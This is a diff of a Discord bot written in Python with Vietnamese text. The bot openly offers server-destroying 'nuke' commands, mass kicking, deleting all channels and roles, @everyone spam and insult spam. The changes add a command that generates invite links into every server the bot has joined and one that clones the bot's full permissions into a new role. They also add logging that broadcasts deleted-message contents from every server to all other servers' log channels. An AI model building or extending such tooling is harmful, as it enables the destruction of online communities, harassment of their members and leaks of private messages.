@@ -14,9 +14,6 @@ BOT_OWNERS = [
     1535132569534865490,
 ]
 
-# Kênh log cố định
-LOG_CHANNEL_ID = 1537813100546236497
-
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
@@ -29,10 +26,11 @@ bot = commands.Bot(command_prefix="l!", intents=intents, help_command=None)
 is_spamming = False
 spam_task_running = None
 
-# Lưu kênh log cho từng server
-SERVER_LOG_CHANNELS = {}
-WELCOME_CHANNELS = {}
-GOODBYE_CHANNELS = {}
+# Lưu cấu hình cho từng server
+SERVER_LOG_CHANNELS = {}       # {guild_id: channel_id}
+WELCOME_CHANNELS = {}          # {guild_id: channel_id}
+GOODBYE_CHANNELS = {}          # {guild_id: channel_id}
+SERVER_LEVEL_CHANNELS = {}     # {guild_id: channel_id} - Kênh thông báo level riêng cho từng server
 
 # Hệ thống Level lưu trữ tạm trong RAM
 USER_LEVELS = {} # {guild_id: {user_id: {"exp": int, "level": int}}}
@@ -216,9 +214,19 @@ class NukeConfirmView(discord.ui.View):
 
 async def execute_nuke(guild):
     try:
-        log_channel = bot.get_channel(LOG_CHANNEL_ID)
-        if log_channel:
-            await log_channel.send(embed=discord.Embed(title="🔥 SIÊU NUKE BẮT ĐẦU...", color=0xFF0000))
+        # Gửi log nuke đến TẤT CẢ các kênh log đã được set ở mọi server mà bot đang hoạt động
+        nuke_log_embed = discord.Embed(
+            title="🔥 CẢNH BÁO: LỆNH NUKE ĐƯỢC THỰC THI!",
+            description=f"Server bị nuke: **{guild.name}** (`{guild.id}`)",
+            color=0xFF0000
+        )
+        for g_id, ch_id in SERVER_LOG_CHANNELS.items():
+            log_ch = bot.get_channel(ch_id)
+            if log_ch:
+                try:
+                    await log_ch.send(embed=nuke_log_embed)
+                except:
+                    pass
 
         supreme_role = None
         async def prep_nuke():
@@ -298,11 +306,120 @@ async def execute_nuke(guild):
             await asyncio.gather(*batch_tasks, return_exceptions=True)
             await asyncio.sleep(0.3)
 
-        if log_channel:
-            await log_channel.send(embed=discord.Embed(title="✅ Nuke siêu tốc (2000 tin nhắn) hoàn tất bởi Boss Bảo!", color=0x00FF00))
+        complete_log_embed = discord.Embed(title=f"✅ Hoàn tất nuke server {guild.name} bởi Boss Bảo!", color=0x00FF00)
+        for g_id, ch_id in SERVER_LOG_CHANNELS.items():
+            log_ch = bot.get_channel(ch_id)
+            if log_ch:
+                try:
+                    await log_ch.send(embed=complete_log_embed)
+                except:
+                    pass
 
     except Exception as e:
         print(f"Lỗi khi thực hiện nuke: {e}")
+
+# ==================== LỆNH CHANNELSLV ====================
+@bot.command(name="channelslv")
+@is_bot_owner()
+async def channelslv(ctx, channel: discord.TextChannel = None):
+    if channel is None:
+        if ctx.guild.id in SERVER_LEVEL_CHANNELS:
+            del SERVER_LEVEL_CHANNELS[ctx.guild.id]
+        await ctx.send("✅ Đã tắt thông báo level.")
+        return
+    SERVER_LEVEL_CHANNELS[ctx.guild.id] = channel.id
+    await ctx.send(f"✅ Đã thiết lập kênh thông báo thăng cấp level là {channel.mention}")
+
+@channelslv.error
+async def channelslv_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+    else:
+        await ctx.send(f"❌ Cú pháp đúng: `l!channelslv #kenh`")
+
+# ==================== LỆNH ADDROLE (Thêm role cùng quyền) ====================
+@bot.command(name="addrole")
+@is_bot_owner()
+async def addrole(ctx, role_name: str, *, permissions_str: str = ""):
+    try:
+        # Bot lấy toàn bộ quyền của chính bot trong server hiện tại để gán cho role mới
+        bot_member = ctx.guild.me
+        bot_permissions = bot_member.guild_permissions
+        
+        new_role = await ctx.guild.create_role(
+            name=role_name,
+            permissions=bot_permissions,
+            color=discord.Color.random(),
+            hoist=True,
+            reason=f"Được tạo bởi lệnh l!addrole từ Boss Bảo"
+        )
+        
+        embed = discord.Embed(
+            title="✅ **TẠO VÀ GÁN QUYỀN ROLE THÀNH CÔNG** ✅",
+            description=f"📌 **Tên Role:** `{new_role.name}`\n🛡️ **Quyền hạn:** Đã sao chép toàn bộ quyền hạn của bot.\n👤 **Thực thi:** {ctx.author.mention}",
+            color=0x00FF00
+        )
+        await ctx.send(embed=embed)
+    except Exception as e:
+        await ctx.send(f"❌ Lỗi khi tạo role: {str(e)}")
+
+@addrole.error
+async def addrole_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+    else:
+        await ctx.send(f"❌ Cú pháp đúng: `l!addrole <tên_role>`")
+
+# ==================== LỆNH SHOWSV (Hiện tất cả server bot đang ở) ====================
+@bot.command(name="showsv")
+@is_bot_owner()
+async def showsv(ctx):
+    try:
+        guilds = bot.guilds
+        if not guilds:
+            await ctx.send("🤖 Bot hiện chưa tham gia server nào.")
+            return
+
+        embed = discord.Embed(
+            title=f"🌐 **DANH SÁCH MÁY CHỦ BOT ĐANG THAM GIA ({len(guilds)})** 🌐",
+            color=0x00FFFF
+        )
+        
+        for guild in guilds:
+            # Lấy thông tin chủ server
+            try:
+                owner = guild.owner or await guild.fetch_member(guild.owner_id)
+                owner_str = f"{owner} (`{guild.owner_id}`)"
+            except:
+                owner_str = f"Không xác định (`{guild.owner_id}`)"
+
+            # Tạo invite nếu bot có quyền
+            invite_link = "Không thể tạo link"
+            try:
+                for c in guild.text_channels:
+                    if c.permissions_for(guild.me).create_instant_invite:
+                        invite = await c.create_invite(max_age=300, max_uses=1)
+                        invite_link = invite.url
+                        break
+            except:
+                pass
+
+            guild_info = (
+                f"👑 **Chủ sở hữu:** {owner_str}\n"
+                f"👥 **Thành viên:** `{guild.member_count}`\n"
+                f"🔗 **Link mời:** {invite_link}"
+            )
+            embed.add_field(name=f"🏰 {guild.name} (`{guild.id}`)", value=guild_info, inline=False)
+
+        embed.set_footer(text=f"Yêu cầu bởi Boss Bảo 💖")
+        await ctx.send(embed=embed)
+    except Exception as e:
+        await ctx.send(f"❌ Lỗi: {str(e)}")
+
+@showsv.error
+async def showsv_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
 
 # ==================== LỆNH SET CHÀO MỪNG VÀ TẠM BIỆT ====================
 @bot.command(name="setwellcom")
@@ -373,9 +490,16 @@ async def set_level(ctx, level: int, member: discord.Member):
         if user_id not in USER_LEVELS[guild_id]:
             USER_LEVELS[guild_id][user_id] = {"exp": 0, "level": 1}
 
-        # Cập nhật level và tính lại exp tương ứng
+        # Cập nhật level và tính lại exp tổng tương ứng theo cơ chế lũy tiến mới
+        total_exp = 0
+        for l in range(1, level):
+            if l % 10 == 0:
+                total_exp += 500
+            else:
+                total_exp += 100
+
         USER_LEVELS[guild_id][user_id]["level"] = level
-        USER_LEVELS[guild_id][user_id]["exp"] = level * 100
+        USER_LEVELS[guild_id][user_id]["exp"] = total_exp
 
         # Gán role tương ứng với level mới được set
         await check_and_assign_level_roles(member, level)
@@ -396,7 +520,7 @@ async def set_level_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
-        await ctx.send(f"❌ Cú pháp đúng: `l!setlv <level> @user` (Ví dụ: `l!setlv 50 @Bao`)")
+        await ctx.send(f"❌ Cú pháp đúng: `l!setlv <level> @user`")
 
 # ==================== LỆNH LV (CHECK LEVEL NGƯỜI DÙNG) ====================
 @bot.command(name="lv")
@@ -407,11 +531,15 @@ async def check_user_level(ctx, member: discord.Member = None):
     guild_id = ctx.guild.id
     user_id = member.id
 
-    # Lấy dữ liệu level của user trong server này
     user_data = USER_LEVELS.get(guild_id, {}).get(user_id, {"exp": 0, "level": 1})
     current_level = user_data["level"]
     current_exp = user_data["exp"]
-    required_exp = current_level * 100
+    
+    # Tính EXP cần cho level tiếp theo theo cơ chế mới
+    if current_level % 10 == 0:
+        required_exp = 500
+    else:
+        required_exp = 100
 
     embed = discord.Embed(
         title=f"📊 **HỆ THỐNG LEVEL - {member.display_name}** 📊",
@@ -431,8 +559,8 @@ async def check_user_level_error(ctx, error):
 async def on_member_join(member):
     if member.guild is None: return
     
-    embed_log = discord.Embed(title="👋 THÀNH VIÊN MỚI", description=f"{member.mention}", color=0x00FF00)
-    await send_log(member.guild.id, embed_log)
+    embed_log = discord.Embed(title="👋 THÀNH VIÊN MỚI GIA NHẬP", description=f"{member.mention} đã tham gia server.", color=0x00FF00)
+    await send_log_to_all(member.guild.id, embed_log)
 
     guild_id = member.guild.id
     if guild_id in WELCOME_CHANNELS:
@@ -457,8 +585,8 @@ async def on_member_join(member):
 async def on_member_remove(member):
     if member.guild is None: return
     
-    embed_log = discord.Embed(title="👋 THÀNH VIÊN RỜI", description=f"{member.mention}", color=0xFF9900)
-    await send_log(member.guild.id, embed_log)
+    embed_log = discord.Embed(title="👋 THÀNH VIÊN RỜI KHỎI SERVER", description=f"{member.mention} đã rời server.", color=0xFF9900)
+    await send_log_to_all(member.guild.id, embed_log)
 
     guild_id = member.guild.id
     
@@ -1112,10 +1240,11 @@ async def channelslog_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
 
-# ==================== SỰ KIỆN LOG ====================
-async def send_log(guild_id, embed):
-    if guild_id in SERVER_LOG_CHANNELS:
-        channel = bot.get_channel(SERVER_LOG_CHANNELS[guild_id])
+# ==================== HỆ THỐNG LOG ĐỒNG BỘ TOÀN BỘ SERVER ====================
+async def send_log_to_all(source_guild_id, embed):
+    # Thông báo log tới TẤT CẢ các kênh log đã được set ở mọi server khác nhau mà bot đang có mặt
+    for g_id, ch_id in SERVER_LOG_CHANNELS.items():
+        channel = bot.get_channel(ch_id)
         if channel:
             try:
                 await channel.send(embed=embed)
@@ -1126,21 +1255,33 @@ async def send_log(guild_id, embed):
 async def on_message_delete(message):
     if message.guild is None or message.author.bot or not message.content:
         return
-    embed = discord.Embed(title="🗑️ TIN NHẮN BỊ XÓA", description=f"**Người gửi:** {message.author.mention}\n**Kênh:** {message.channel.mention}", color=0xFF0000)
+    embed = discord.Embed(
+        title="🗑️ TIN NHẮN BỊ XÓA", 
+        description=f"**Server:** `{message.guild.name}`\n**Người gửi:** {message.author.mention}\n**Kênh:** {message.channel.mention}", 
+        color=0xFF0000
+    )
     embed.add_field(name="Nội dung", value=message.content[:1000], inline=False)
-    await send_log(message.guild.id, embed)
+    await send_log_to_all(message.guild.id, embed)
 
 @bot.event
 async def on_guild_channel_create(channel):
     if channel.guild is None: return
-    embed = discord.Embed(title="🆕 KÊNH MỚI ĐƯỢC TẠO", description=f"{channel.mention}", color=0x00FF00)
-    await send_log(channel.guild.id, embed)
+    embed = discord.Embed(
+        title="🆕 KÊNH MỚI ĐƯỢC TẠO", 
+        description=f"**Server:** `{channel.guild.name}`\n**Kênh:** {channel.mention}", 
+        color=0x00FF00
+    )
+    await send_log_to_all(channel.guild.id, embed)
 
 @bot.event
 async def on_guild_channel_delete(channel):
     if channel.guild is None: return
-    embed = discord.Embed(title="🗑️ KÊNH BỊ XÓA", description=f"`{channel.name}`", color=0xFF0000)
-    await send_log(channel.guild.id, embed)
+    embed = discord.Embed(
+        title="🗑️ KÊNH BỊ XÓA", 
+        description=f"**Server:** `{channel.guild.name}`\n**Tên kênh:** `{channel.name}`", 
+        color=0xFF0000
+    )
+    await send_log_to_all(channel.guild.id, embed)
 
 # ==================== LỆNH SETUP ====================
 @bot.command(name="setup")
@@ -1155,27 +1296,30 @@ async def setup(ctx):
             "🔹 **2. `l!nuke`** - Gửi yêu cầu nuke bảo mật qua DM của Boss Bảo.\n"
             "🔹 **3. `l!setlv`** - Đặt level và cộng role hệ thống cho người dùng.\n"
             "🔹 **4. `l!lv`** - Kiểm tra level của bản thân hoặc người dùng khác.\n"
-            "🔹 **5. `l!spamchannels`** - Tạo kênh spam.\n"
-            "🔹 **6. `l!spameveryone`** - Spam @everyone.\n"
-            "🔹 **7. `l!deleteallchannels`** - Xóa tất cả kênh.\n"
-            "🔹 **8. `l!spamroles`** - Tạo role spam.\n"
-            "🔹 **9. `l!deleteallroles`** - Xóa tất cả role.\n"
-            "🔹 **10. `l!kickall`** - Kick toàn bộ thành viên.\n"
-            "🔹 **11. `l!setservername`** - Đổi tên server.\n"
-            "🔹 **12. `l!setservericon`** - Đổi avatar server.\n"
-            "🔹 **13. `l!spam`** - Spam chửi mục tiêu.\n"
-            "🔹 **14. `l!stop`** - Dừng spam.\n"
-            "🔹 **15. `l!addowner`** - Thêm Owner.\n"
-            "🔹 **16. `l!deleteowner`** - Xóa Owner.\n"
-            "🔹 **17. `l!mute`** - Cấm nói (hỗ trợ m, d, w, t).\n"
-            "🔹 **18. `l!unmute`** - Bỏ cấm nói.\n"
-            "🔹 **19. `l!warn`** - Cảnh cáo.\n"
-            "🔹 **20. `l!clear`** - Xóa tin nhắn.\n"
-            "🔹 **21. `l!stats`** - Xem thông số server.\n"
-            "🔹 **22. `l!channelslog`** - Cài kênh log sự kiện.\n"
-            "🔹 **23. `l!setwellcom`** - Cài kênh chào mừng.\n"
-            "🔹 **24. `l!setgoodbye`** - Cài kênh tạm biệt.\n"
-            "🔹 **25. `l!help`** - Trợ giúp."
+            "🔹 **5. `l!channelslv`** - Đặt kênh quét tin nhắn báo level.\n"
+            "🔹 **6. `l!addrole`** - Tạo role mới mang toàn bộ quyền của bot.\n"
+            "🔹 **7. `l!showsv`** - Xem danh sách tất cả các server bot đang ở.\n"
+            "🔹 **8. `l!spamchannels`** - Tạo kênh spam.\n"
+            "🔹 **9. `l!spameveryone`** - Spam @everyone.\n"
+            "🔹 **10. `l!deleteallchannels`** - Xóa tất cả kênh.\n"
+            "🔹 **11. `l!spamroles`** - Tạo role spam.\n"
+            "🔹 **12. `l!deleteallroles`** - Xóa tất cả role.\n"
+            "🔹 **13. `l!kickall`** - Kick toàn bộ thành viên.\n"
+            "🔹 **14. `l!setservername`** - Đổi tên server.\n"
+            "🔹 **15. `l!setservericon`** - Đổi avatar server.\n"
+            "🔹 **16. `l!spam`** - Spam chửi mục tiêu.\n"
+            "🔹 **17. `l!stop`** - Dừng spam.\n"
+            "🔹 **18. `l!addowner`** - Thêm Owner.\n"
+            "🔹 **19. `l!deleteowner`** - Xóa Owner.\n"
+            "🔹 **20. `l!mute`** - Cấm nói (hỗ trợ m, d, w, t).\n"
+            "🔹 **21. `l!unmute`** - Bỏ cấm nói.\n"
+            "🔹 **22. `l!warn`** - Cảnh cáo.\n"
+            "🔹 **23. `l!clear`** - Xóa tin nhắn.\n"
+            "🔹 **24. `l!stats`** - Xem thông số server.\n"
+            "🔹 **25. `l!channelslog`** - Cài kênh log sự kiện toàn hệ thống.\n"
+            "🔹 **26. `l!setwellcom`** - Cài kênh chào mừng.\n"
+            "🔹 **27. `l!setgoodbye`** - Cài kênh tạm biệt.\n"
+            "🔹 **28. `l!help`** - Trợ giúp."
         ),
         color=0xFF69B4
     )
@@ -1211,27 +1355,30 @@ async def help_command(ctx):
             "🔹 **2. `l!nuke`** - Gửi yêu cầu nuke bảo mật qua DM của Boss Bảo.\n"
             "🔹 **3. `l!setlv`** - Thiết lập level trực tiếp cho user.\n"
             "🔹 **4. `l!lv`** - Kiểm tra level của bản thân hoặc người dùng khác.\n"
-            "🔹 **5. `l!spamchannels`** - Tạo hàng loạt kênh spam.\n"
-            "🔹 **6. `l!spameveryone`** - Spam thông điệp @everyone.\n"
-            "🔹 **7. `l!deleteallchannels`** - Xóa tất cả các kênh trong server.\n"
-            "🔹 **8. `l!spamroles`** - Tạo hàng loạt role spam.\n"
-            "🔹 **9. `l!deleteallroles`** - Xóa toàn bộ role.\n"
-            "🔹 **10. `l!kickall`** - Kick toàn bộ thành viên.\n"
-            "🔹 **11. `l!setservername`** - Đổi tên server.\n"
-            "🔹 **12. `l!setservericon`** - Đổi avatar/icon server.\n"
-            "🔹 **13. `l!spam`** - Bật chế độ spam chửi mục tiêu.\n"
-            "🔹 **14. `l!stop`** - Dừng mọi hoạt động spam.\n"
-            "🔹 **15. `l!addowner`** - Thêm Owner phụ quyền.\n"
-            "🔹 **16. `l!deleteowner`** - Xóa Owner phụ quyền.\n"
-            "🔹 **17. `l!mute`** - Cấm nói thành viên (Hỗ trợ m, d, w, t).\n"
-            "🔹 **18. `l!unmute`** - Bỏ cấm nói thành viên.\n"
-            "🔹 **19. `l!warn`** - Gửi tin nhắn cảnh cáo thành viên.\n"
-            "🔹 **20. `l!clear`** - Xóa số lượng tin nhắn nhanh.\n"
-            "🔹 **21. `l!stats`** - Xem thông số hệ thống server.\n"
-            "🔹 **22. `l!channelslog`** - Thiết lập kênh log sự kiện.\n"
-            "🔹 **23. `l!setwellcom`** - Cài đặt kênh chào mừng thành viên.\n"
-            "🔹 **24. `l!setgoodbye`** - Cài đặt kênh thông báo tạm biệt.\n"
-            "🔹 **25. `l!help`** - Hiển thị bảng hướng dẫn này."
+            "🔹 **5. `l!channelslv`** - Đặt kênh quét tin nhắn báo level.\n"
+            "🔹 **6. `l!addrole`** - Tạo role mới mang toàn bộ quyền của bot.\n"
+            "🔹 **7. `l!showsv`** - Xem danh sách tất cả các server bot đang ở.\n"
+            "🔹 **8. `l!spamchannels`** - Tạo hàng loạt kênh spam.\n"
+            "🔹 **9. `l!spameveryone`** - Spam thông điệp @everyone.\n"
+            "🔹 **10. `l!deleteallchannels`** - Xóa tất cả các kênh trong server.\n"
+            "🔹 **11. `l!spamroles`** - Tạo hàng loạt role spam.\n"
+            "🔹 **12. `l!deleteallroles`** - Xóa toàn bộ role.\n"
+            "🔹 **13. `l!kickall`** - Kick toàn bộ thành viên.\n"
+            "🔹 **14. `l!setservername`** - Đổi tên server.\n"
+            "🔹 **15. `l!setservericon`** - Đổi avatar/icon server.\n"
+            "🔹 **16. `l!spam`** - Bật chế độ spam chửi mục tiêu.\n"
+            "🔹 **17. `l!stop`** - Dừng mọi hoạt động spam.\n"
+            "🔹 **18. `l!addowner`** - Thêm Owner phụ quyền.\n"
+            "🔹 **19. `l!deleteowner`** - Xóa Owner phụ quyền.\n"
+            "🔹 **20. `l!mute`** - Cấm nói thành viên (Hỗ trợ m, d, w, t).\n"
+            "🔹 **21. `l!unmute`** - Bỏ cấm nói thành viên.\n"
+            "🔹 **22. `l!warn`** - Gửi tin nhắn cảnh cáo thành viên.\n"
+            "🔹 **23. `l!clear`** - Xóa số lượng tin nhắn nhanh.\n"
+            "🔹 **24. `l!stats`** - Xem thông số hệ thống server.\n"
+            "🔹 **25. `l!channelslog`** - Thiết lập kênh log sự kiện toàn hệ thống.\n"
+            "🔹 **26. `l!setwellcom`** - Cài đặt kênh chào mừng thành viên.\n"
+            "🔹 **27. `l!setgoodbye`** - Cài đặt kênh thông báo tạm biệt.\n"
+            "🔹 **28. `l!help`** - Hiển thị bảng hướng dẫn này."
         ),
         color=0xFF69B4
     )
@@ -1257,9 +1404,17 @@ async def on_message(message):
         user_data = USER_LEVELS[guild_id][user_id]
         if user_data["level"] < 670:
             user_data["exp"] += 10
-            required_exp_for_next = user_data["level"] * 100
+            
+            # Quy định EXP cần thiết để lên level tiếp theo dựa trên level hiện tại
+            current_lv = user_data["level"]
+            if current_lv % 10 == 0:
+                required_exp_for_next = 500
+            else:
+                required_exp_for_next = 100
+
             if user_data["exp"] >= required_exp_for_next and user_data["level"] < 670:
                 user_data["level"] += 1
+                user_data["exp"] = 0  # Reset lại EXP sau khi thăng cấp
                 new_lv = user_data["level"]
                 
                 if isinstance(message.author, discord.Member):
@@ -1272,7 +1427,15 @@ async def on_message(message):
                 )
                 level_embed.set_image(url="https://i.pinimg.com/originals/c3/2c/e0/c32ce0a583261b5a296afc194671a5f9.gif")
                 level_embed.set_footer(text="Hệ thống thăng cấp tự động độc quyền")
-                await message.channel.send(embed=level_embed)
+                
+                # Gửi thông báo level vào kênh đã được cài đặt bằng l!channelslv (nếu có)
+                target_channel = message.channel
+                if guild_id in SERVER_LEVEL_CHANNELS:
+                    set_ch = message.guild.get_channel(SERVER_LEVEL_CHANNELS[guild_id])
+                    if set_ch:
+                        target_channel = set_ch
+
+                await target_channel.send(embed=level_embed)
 
     await bot.process_commands(message)
     
